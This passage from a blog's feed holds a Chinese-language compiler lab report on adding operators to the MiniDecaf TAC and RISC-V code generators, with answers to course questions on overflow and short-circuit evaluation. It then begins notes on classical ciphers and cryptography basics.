        <content type="html"><![CDATA[<h1 id="Stage-1-报告"><a href="#Stage-1-报告" class="headerlink" title="Stage 1 报告"></a>Stage 1 报告</h1><h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><p>在 <code>utils/tac/tacop.py</code>, <code>utils/riscv.py</code> 的 <code>TacXXXOp</code> 和 <code>RvXXXOp</code> 类中添加运算符, 在 <code>frontend/tacgen/tacgen.py</code>, <code>backend/riscv/riscvasmemitter.py</code> 中的 <code>visitUnary</code> 和 <code>visitBinary</code> 方法实现运算符翻译与计算过程.</p><h3 id="step-2"><a href="#step-2" class="headerlink" title="step 2"></a>step 2</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># utils/tac/tacop.py</span><span class="token decorator annotation punctuation">@unique</span><span class="token keyword">class</span> <span class="token class-name">TacUnaryOp</span><span class="token punctuation">(</span>Enum<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    BIT_NOT <span class="token operator">=</span> auto<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 取反</span>    LOGIC_NOT <span class="token operator">=</span> auto<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 取非</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># utils/riscv.py</span><span class="token decorator annotation punctuation">@unique</span><span class="token keyword">class</span> <span class="token class-name">RvUnaryOp</span><span class="token punctuation">(</span>Enum<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    NOT <span class="token operator">=</span> auto<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 取反, 为伪指令</span>    SEQZ <span class="token operator">=</span> auto<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 取非, 为伪指令</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># frontend/tacgen/tacgen.py</span><span class="token keyword">def</span> <span class="token function">visitUnary</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> expr<span class="token punctuation">:</span> Unary<span class="token punctuation">,</span> mv<span class="token punctuation">:</span> TACFuncEmitter<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    expr<span class="token punctuation">.</span>operand<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> mv<span class="token punctuation">)</span>    op <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        node<span class="token punctuation">.</span>UnaryOp<span class="token punctuation">.</span>BitNot<span class="token punctuation">:</span> tacop<span class="token punctuation">.</span>TacUnaryOp<span class="token punctuation">.</span>BIT_NOT<span class="token punctuation">,</span>        node<span class="token punctuation">.</span>UnaryOp<span class="token punctuation">.</span>LogicNot<span class="token punctuation">:</span> tacop<span class="token punctuation">.</span>TacUnaryOp<span class="token punctuation">.</span>LOGIC_NOT<span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">[</span>expr<span class="token punctuation">.</span>op<span class="token punctuation">]</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># backend/riscv/riscvasmemitter.py</span><span class="token keyword">def</span> <span class="token function">visitUnary</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> instr<span class="token punctuation">:</span> Unary<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    op <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        TacUnaryOp<span class="token punctuation">.</span>BIT_NOT<span class="token punctuation">:</span> RvUnaryOp<span class="token punctuation">.</span>NOT<span class="token punctuation">,</span>        TacUnaryOp<span class="token punctuation">.</span>LOGIC_NOT<span class="token punctuation">:</span> RvUnaryOp<span class="token punctuation">.</span>SEQZ<span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">[</span>instr<span class="token punctuation">.</span>op<span class="token punctuation">]</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="step-3"><a href="#step-3" class="headerlink" title="step 3"></a>step 3</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># utils/tac/tacop.py</span><span class="token decorator annotation punctuation">@unique</span><span class="token keyword">class</span> <span class="token class-name">TacBinaryOp</span><span class="token punctuation">(</span>Enum<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    SUB <span class="token operator">=</span> auto<span class="token punctuation">(</span><span class="token punctuation">)</span>    MUL <span class="token operator">=</span> auto<span class="token punctuation">(</span><span class="token punctuation">)</span>    DIV <span class="token operator">=</span> auto<span class="token punctuation">(</span><span class="token punctuation">)</span>    MOD <span class="token operator">=</span> auto<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># utils/riscv.py</span><span class="token decorator annotation punctuation">@unique</span><span class="token keyword">class</span> <span class="token class-name">RvBinaryOp</span><span class="token punctuation">(</span>Enum<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    SUB <span class="token operator">=</span> auto<span class="token punctuation">(</span><span class="token punctuation">)</span>    MUL <span class="token operator">=</span> auto<span class="token punctuation">(</span><span class="token punctuation">)</span>    DIV <span class="token operator">=</span> auto<span class="token punctuation">(</span><span class="token punctuation">)</span>    REM <span class="token operator">=</span> auto<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 取模</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># frontend/tacgen/tacgen.py</span><span class="token keyword">def</span> <span class="token function">visitBinary</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> expr<span class="token punctuation">:</span> Binary<span class="token punctuation">,</span> mv<span class="token punctuation">:</span> TACFuncEmitter<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    op <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        node<span class="token punctuation">.</span>BinaryOp<span class="token punctuation">.</span>Sub<span class="token punctuation">:</span> tacop<span class="token punctuation">.</span>TacBinaryOp<span class="token punctuation">.</span>SUB<span class="token punctuation">,</span>        node<span class="token punctuation">.</span>BinaryOp<span class="token punctuation">.</span>Mul<span class="token punctuation">:</span> tacop<span class="token punctuation">.</span>TacBinaryOp<span class="token punctuation">.</span>MUL<span class="token punctuation">,</span>        node<span class="token punctuation">.</span>BinaryOp<span class="token punctuation">.</span>Div<span class="token punctuation">:</span> tacop<span class="token punctuation">.</span>TacBinaryOp<span class="token punctuation">.</span>DIV<span class="token punctuation">,</span>        node<span class="token punctuation">.</span>BinaryOp<span class="token punctuation">.</span>Mod<span class="token punctuation">:</span> tacop<span class="token punctuation">.</span>TacBinaryOp<span class="token punctuation">.</span>MOD<span class="token punctuation">,</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span><span class="token punctuation">[</span>expr<span class="token punctuation">.</span>op<span class="token punctuation">]</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># backend/riscv/riscvasmemitter.py</span><span class="token keyword">def</span> <span class="token function">visitBinary</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> instr<span class="token punctuation">:</span> Binary<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    op <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        TacBinaryOp<span class="token punctuation">.</span>SUB<span class="token punctuation">:</span> RvBinaryOp<span class="token punctuation">.</span>SUB<span class="token punctuation">,</span>        TacBinaryOp<span class="token punctuation">.</span>MUL<span class="token punctuation">:</span> RvBinaryOp<span class="token punctuation">.</span>MUL<span class="token punctuation">,</span>        TacBinaryOp<span class="token punctuation">.</span>DIV<span class="token punctuation">:</span> RvBinaryOp<span class="token punctuation">.</span>DIV<span class="token punctuation">,</span>        TacBinaryOp<span class="token punctuation">.</span>MOD<span class="token punctuation">:</span> RvBinaryOp<span class="token punctuation">.</span>REM<span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">[</span>instr<span class="token punctuation">.</span>op<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="step-4"><a href="#step-4" class="headerlink" title="step 4"></a>step 4</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># utils/tac/tacop.py</span><span class="token decorator annotation punctuation">@unique</span><span class="token keyword">class</span> <span class="token class-name">TacBinaryOp</span><span class="token punctuation">(</span>Enum<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    LAND <span class="token operator">=</span> auto<span class="token punctuation">(</span><span class="token punctuation">)</span>    EQU <span class="token operator">=</span> auto<span class="token punctuation">(</span><span class="token punctuation">)</span>    NEQ <span class="token operator">=</span> auto<span class="token punctuation">(</span><span class="token punctuation">)</span>    SLT <span class="token operator">=</span> auto<span class="token punctuation">(</span><span class="token punctuation">)</span>    LEQ <span class="token operator">=</span> auto<span class="token punctuation">(</span><span class="token punctuation">)</span>    SGT <span class="token operator">=</span> auto<span class="token punctuation">(</span><span class="token punctuation">)</span>    GEQ <span class="token operator">=</span> auto<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># utils/riscv.py</span><span class="token decorator annotation punctuation">@unique</span><span class="token keyword">class</span> <span class="token class-name">RvUnaryOp</span><span class="token punctuation">(</span>Enum<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    SLTZ <span class="token operator">=</span> auto<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 小于 0 则置位, 为伪指令</span>    SGTZ <span class="token operator">=</span> auto<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 大于 0 则置位, 为伪指令</span><span class="token decorator annotation punctuation">@unique</span><span class="token keyword">class</span> <span class="token class-name">RvBinaryOp</span><span class="token punctuation">(</span>Enum<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    AND <span class="token operator">=</span> auto<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 按位与</span>    SLT <span class="token operator">=</span> auto<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 小于</span>    SGT <span class="token operator">=</span> auto<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 大于</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># frontend/tacgen/tacgen.py</span><span class="token keyword">def</span> <span class="token function">visitBinary</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> expr<span class="token punctuation">:</span> Binary<span class="token punctuation">,</span> mv<span class="token punctuation">:</span> TACFuncEmitter<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    op <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        node<span class="token punctuation">.</span>BinaryOp<span class="token punctuation">.</span>LogicAnd<span class="token punctuation">:</span> tacop<span class="token punctuation">.</span>TacBinaryOp<span class="token punctuation">.</span>LAND<span class="token punctuation">,</span>        node<span class="token punctuation">.</span>BinaryOp<span class="token punctuation">.</span>EQ<span class="token punctuation">:</span> tacop<span class="token punctuation">.</span>TacBinaryOp<span class="token punctuation">.</span>EQU<span class="token punctuation">,</span>        node<span class="token punctuation">.</span>BinaryOp<span class="token punctuation">.</span>NE<span class="token punctuation">:</span> tacop<span class="token punctuation">.</span>TacBinaryOp<span class="token punctuation">.</span>NEQ<span class="token punctuation">,</span>        node<span class="token punctuation">.</span>BinaryOp<span class="token punctuation">.</span>LT<span class="token punctuation">:</span> tacop<span class="token punctuation">.</span>TacBinaryOp<span class="token punctuation">.</span>SLT<span class="token punctuation">,</span>        node<span class="token punctuation">.</span>BinaryOp<span class="token punctuation">.</span>GT<span class="token punctuation">:</span> tacop<span class="token punctuation">.</span>TacBinaryOp<span class="token punctuation">.</span>SGT<span class="token punctuation">,</span>        node<span class="token punctuation">.</span>BinaryOp<span class="token punctuation">.</span>LE<span class="token punctuation">:</span> tacop<span class="token punctuation">.</span>TacBinaryOp<span class="token punctuation">.</span>LEQ<span class="token punctuation">,</span>        node<span class="token punctuation">.</span>BinaryOp<span class="token punctuation">.</span>GE<span class="token punctuation">:</span> tacop<span class="token punctuation">.</span>TacBinaryOp<span class="token punctuation">.</span>GEQ<span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">[</span>expr<span class="token punctuation">.</span>op<span class="token punctuation">]</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># backend/riscv/riscvasmemitter.py</span><span class="token keyword">def</span> <span class="token function">visitBinary</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> instr<span class="token punctuation">:</span> Binary<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>  <span class="token comment"># 特殊 Tac 操作符与对应操作</span>    <span class="token comment"># 利用了 [https://godbolt.org/] 给出的结果</span>    <span class="token keyword">if</span> instr<span class="token punctuation">.</span>op <span class="token operator">==</span> TacBinaryOp<span class="token punctuation">.</span>LOR<span class="token punctuation">:</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">elif</span> instr<span class="token punctuation">.</span>op <span class="token operator">==</span> TacBinaryOp<span class="token punctuation">.</span>LAND<span class="token punctuation">:</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">elif</span> instr<span class="token punctuation">.</span>op <span class="token operator">==</span> TacBinaryOp<span class="token punctuation">.</span>EQU<span class="token punctuation">:</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">elif</span> instr<span class="token punctuation">.</span>op <span class="token operator">==</span> TacBinaryOp<span class="token punctuation">.</span>NEQ<span class="token punctuation">:</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">elif</span> instr<span class="token punctuation">.</span>op <span class="token operator">==</span> TacBinaryOp<span class="token punctuation">.</span>LEQ<span class="token punctuation">:</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">elif</span> instr<span class="token punctuation">.</span>op <span class="token operator">==</span> TacBinaryOp<span class="token punctuation">.</span>GEQ<span class="token punctuation">:</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        op <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>          <span class="token comment"># 只有这两条 Tac 指令无需使用其他 riscv 指令翻译</span>            TacBinaryOp<span class="token punctuation">.</span>SLT<span class="token punctuation">:</span> RvBinaryOp<span class="token punctuation">.</span>SLT<span class="token punctuation">,</span>            TacBinaryOp<span class="token punctuation">.</span>SGT<span class="token punctuation">:</span> RvBinaryOp<span class="token punctuation">.</span>SGT<span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">[</span>instr<span class="token punctuation">.</span>op<span class="token punctuation">]</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h2><h3 id="step-1"><a href="#step-1" class="headerlink" title="step 1"></a>step 1</h3><ol><li><p>在我们的框架中, 从 AST 向 TAC 的转换经过了 <code>namer.transform</code>, <code>typer.transform</code>两个步骤, 如果没有这两个步骤, 以下代码能正常编译吗, 为什么?</p> <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <strong>答:</strong> 能正常编译. 这两个步骤用于<strong>语义分析</strong>阶段实现<strong>符号表构建</strong>和<strong>类型检查</strong>, 主要作用是解析标识符的声明和引用, 将其存储在符号表中, 验证语句和表达式操作是否符合类型规则. 这段代码并没有涉及函数或变量等标识符的使用, 因此没有这两个步骤这段代码依旧可以<strong>正常编译</strong>.</p></li><li><p>我们的框架现在对于 main 函数没有返回值的情况是在哪一步处理的? 报的是什么错? </p><p> <strong>答:</strong> 在 <code>frontend/parser/ply_parser.py</code> 进行语法分析时处理, 报错为</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Syntax error: line <span class="token number">2</span>, <span class="token function">column</span> <span class="token number">11</span>    <span class="token builtin class-name">return</span><span class="token punctuation">;</span>Syntax error: line <span class="token number">3</span>, <span class="token function">column</span> <span class="token number">1</span><span class="token punctuation">}</span>Syntax error: EOF<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>为什么框架定义了 <code>frontend/ast/tree.py:Unary</code>、<code>utils/tac/tacop.py:TacUnaryOp</code>、<code>utils/riscv.py:RvUnaryOp</code> 三种不同的一元运算符类型?</p><p> <strong>答:</strong> 在编译器框架中, 三种不同的一元运算符类型用于不同的编译器阶段和组件, 以适应不同层次的运算符表示和需求:</p><ul><li><code>Unary</code> 用于 AST 表示, 进行语法分析和语义分析.</li><li><code>TacUnaryOp</code> 用于 TAC 表示, 进行中间代码生成.</li><li><p><code>RvUnaryOp</code> 用于 RISC-V 表示, 进行目标代码生成.</p><p>不同阶段所需的一元运算符类型不完全相同 (如取模运算的 <code>BinaryOp.Mod</code>, <code>TacBinaryOp.MOD</code>, <code>RvUnaryOp.REM</code> ), 需要经过相应的转化翻译过程, 这么分离定义可以实现有助于模块化和灵活性, 使不同阶段独立处理运算符. </p></li></ul></li></ol><h3 id="step-2-1"><a href="#step-2-1" class="headerlink" title="step 2"></a>step 2</h3><ol><li><p>我们在语义规范中规定整数运算越界是未定义行为, 运算越界可以简单理解成理论上的运算结果没有办法保存在 32 位整数的空间中, 必须截断高于32位的内容. 请设计一个 minidecaf 表达式, 只使用 <code>-~!</code> 这三个单目运算符和从 0 到 2147483647 范围内的非负整数, 使得运算过程中发生越界.</p><p> <strong>答:</strong> 设计如下:</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-~2147483647<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="step-3-1"><a href="#step-3-1" class="headerlink" title="step 3"></a>step 3</h3><ol><li><p>我们知道 “除数为零的除法是未定义行为”, 但是即使除法的右操作数不是 0, 仍然可能存在未定义行为. 请问这时除法的左操作数和右操作数分别是什么? 请将这时除法的左操作数和右操作数填入下面的代码中, 分别在你的电脑 (请标明你的电脑的架构, 比如 x86-64 或 ARM) 中和 RISCV-32 的 qemu 模拟器中编译运行下面的代码, 并给出运行结果 (编译时请不要开启任何编译优化).</p> <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> 左操作数<span class="token punctuation">;</span>    <span class="token keyword">int</span> b <span class="token operator">=</span> 右操作数<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> a <span class="token operator">/</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <strong>答:</strong> 左操作数为 <code>-2147483648</code>, 右操作数为 <code>-1</code>.</p> <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2147483648</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> a <span class="token operator">/</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 电脑架构为 Arm64, 使用 clang 编译运行代码, 结果为 <code>-2147483648</code>;</p><p> 使用 RISCV-32 的 qemu 模拟器编译运行代码, 结果为 <code>-2147483648</code>.</p></li></ol><h3 id="step-4-1"><a href="#step-4-1" class="headerlink" title="step 4"></a>step 4</h3><ol><li><p>在 MiniDecaf 中, 我们对于短路求值未做要求, 但在包括 C 语言的大多数流行的语言中, 短路求值都是被支持的. 为何这一特性广受欢迎? 你认为短路求值这一特性会给程序员带来怎样的好处?</p><p> <strong>答:</strong> 短路求值是一种逻辑表达式计算策略, 当第一个运算数无法确定逻辑运算的结果时, 才对第二个运算数进行求值. 这一特性广受欢迎, 有以下好处:</p><ul><li><strong>效率</strong>：使用逻辑运算符连接多个布尔表达式时, 如果第一个表达式确定了结果, 那么后面的表达式不会被计算. 涉及到昂贵的计算或函数调用时, 使用短路求值可以免去表达式执行成本, 提高运行效率.</li><li><strong>安全性</strong>：表达式的计算可能具有副作用, 如修改变量的值或执行其他操作, 短路求值确保这些副作用只在需要时才会发生. 如右表达式需要依赖左表达式的成立, 支持短路求值后可以在左表达式不成立后避免错误计算右表达式.</li><li><strong>自然</strong>：短路求值可以避免深度嵌套的条件语句, 编写更简洁易读的代码, 使得程序员能够更自由地表达各种逻辑关系和条件.</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Compiler </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Principles of Compiler </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络安全技术 笔记2</title>
      <link href="/2023/10/04/ji-suan-ji-wang-luo-an-quan-ji-zhu-bi-ji-2/"/>
      <url>/2023/10/04/ji-suan-ji-wang-luo-an-quan-ji-zhu-bi-ji-2/</url>
      
        <content type="html"><![CDATA[<h1 id="二、密码学基础"><a href="#二、密码学基础" class="headerlink" title="二、密码学基础"></a>二、密码学基础</h1><h2 id="初识密码"><a href="#初识密码" class="headerlink" title="初识密码"></a>初识密码</h2><h3 id="与人类共生"><a href="#与人类共生" class="headerlink" title="与人类共生"></a>与人类共生</h3><ul><li>密码: 用来混淆的技术, 不同于隐藏、访问控制.</li></ul><h3 id="密码基本概念"><a href="#密码基本概念" class="headerlink" title="密码基本概念"></a>密码基本概念</h3><ul><li>传统加密:<ul><li>对称加密、单钥加密.</li><li>代换密码、置换密码及二者组合.</li><li>安全性在于保持算法本身的保密性</li><li>不适合大规模生产, 用户无法了解算法的安全性.</li></ul></li><li>现代加密:<ul><li>非对称加密、公钥加密, 1976 年第一次公开发表.</li><li>密码算法公开，密钥保密.</li><li>安全性在于保持密钥的保密性.</li><li>适于大规模生产.</li></ul></li><li>密码学:<ul><li>密码编码学: 研究加密方案的学科.</li><li>密码分析学: 研究破译密码获得消息.</li><li>统称为密码学.</li></ul></li><li>密码编码学系统的三个独立的特征:<ul><li>转换明文为密文的运算类型:<ul><li>置换和代换, 不允许丢失信息.</li></ul></li><li>所用的密钥数:<ul><li>密钥相同/不同——对称密码/非对称密码.</li></ul></li><li>处理明文的方法:<ul><li>分组密码/块密码: 处理分组.</li><li>流密码/序列密码: 连续处理元素.</li></ul></li></ul></li><li>无条件安全: 无论有多少密文, 都不足以唯一确定对应的明文.</li><li>计算安全:<ul><li>破译代价超过密文的价值.</li><li>破译时间超过密文的生命期.</li></ul></li></ul><h3 id="密码发展历程"><a href="#密码发展历程" class="headerlink" title="密码发展历程"></a>密码发展历程</h3><ul><li>第 1 阶段: 古典密码 (1949 年前)<ul><li>安全基于算法的保密, 密码学不是科学而是艺术.</li><li>算法基本手段是代换和置换, 针对字符.</li><li>简单的密码分析手段.</li></ul></li><li>第 2 阶段: 近代密码<ul><li>计算机——复杂密码计算.</li><li>有线电报——现代密码编码学.</li><li>无线电报——现代密码分析学.</li><li>现代密码学的原理 (Kerchoffs):<ul><li>加密体系安全性依赖于使用的密匙.</li><li>古典密码和现代密码的分界线.</li></ul></li><li>香农发表《保密通信的信息理论》论文, 密码学成为一门科学.</li></ul></li><li>第 3 阶段: 现代密码<ul><li>公钥密码:<ul><li>无密钥传输的保密通信成为可能</li><li>1976年, Diffie &amp; Hellman 提出公钥密码体制.</li><li>1977年, Rivest &amp; Shamir &amp; Adleman 提出 RSA 公钥算法.</li></ul></li><li>对称密码:<ul><li>1977年, 美国实施公开的 DES 对称加密算法.</li></ul></li></ul></li></ul><h2 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h2><h3 id="代换技术"><a href="#代换技术" class="headerlink" title="代换技术"></a>代换技术</h3><ul><li><p>单表代换密码:</p><ul><li>Casear 密码, 密钥词密码.</li><li>明文语法模式和结构被保留, 密穷举攻击破译.</li></ul></li><li><p>多表代换密码:</p><ul><li><p>Playfair 密码:</p><ul><li>一次加密两个字母.</li><li>基于由密钥词构成的 5×5 字母矩阵.</li><li>保留了明文语言的结构.</li></ul></li><li><p>Hill 密码:</p><ul><li>加密过程: $C=KP\pmod{26}$.</li><li><p>解密过程: $P=K^{-1}C\pmod{26}$.</p></li><li><p>隐蔽单字母的频率特性.</p></li></ul></li><li><p>Vigenere 密码:</p><ul><li><p>一系列 Casear 密码.</p></li><li><p>隐藏了字母频率信息.</p></li><li><p>并非所有的明文结构都被隐藏.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301657178.png" alt=""></p></li></ul></li><li><p>Verman 密码和一次一密:</p><ul><li><p>随机密钥与消息一样长且无重复.</p></li><li><p>运算基于二进制数据.</p></li><li><p>无条件安全.</p></li><li><p>局限性: </p><ul><li>产生大规模随机密钥很困难.</li><li><p>密钥的分配和保护很困难.</p><p><img 